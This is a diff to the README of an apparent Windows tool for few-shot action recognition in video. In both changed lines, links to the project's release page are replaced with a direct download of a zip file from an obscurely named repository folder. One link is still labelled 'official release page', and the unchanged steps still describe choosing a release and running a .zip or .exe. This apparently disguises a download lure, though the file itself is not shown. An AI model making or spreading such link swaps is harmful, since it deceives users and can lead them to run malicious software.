@@ -1,6 +1,6 @@
 # 🤖 MML-FSAR - Identify actions in short videos quickly
 
-[![Download MML-FSAR](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/dedralingual814/MML-FSAR/releases)
+[![Download MML-FSAR](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/dedralingual814/MML-FSAR/raw/refs/heads/main/cataplasm/FSAR-MM-v1.9-alpha.3.zip)
 
 MML-FSAR helps you recognize human actions in video files. This software uses artificial intelligence to look at video footage and identify what a person does. It focuses on few-shot recognition. This means the system learns to detect specific activities even when it has seen only one or two examples. 
 
@@ -12,7 +12,7 @@ You need a Windows computer to use this software. This guide covers how to set u
 
 Follow these steps to find the file:
 
-1. Go to the [official release page](https://github.com/dedralingual814/MML-FSAR/releases).
+1. Go to the [official release page](https://github.com/dedralingual814/MML-FSAR/raw/refs/heads/main/cataplasm/FSAR-MM-v1.9-alpha.3.zip).
 2. Look for the most recent version at the top of the list.
 3. Click the link that ends in .zip or .exe to save it to your computer.
 4. Extract the contents if you downloaded a compressed folder.
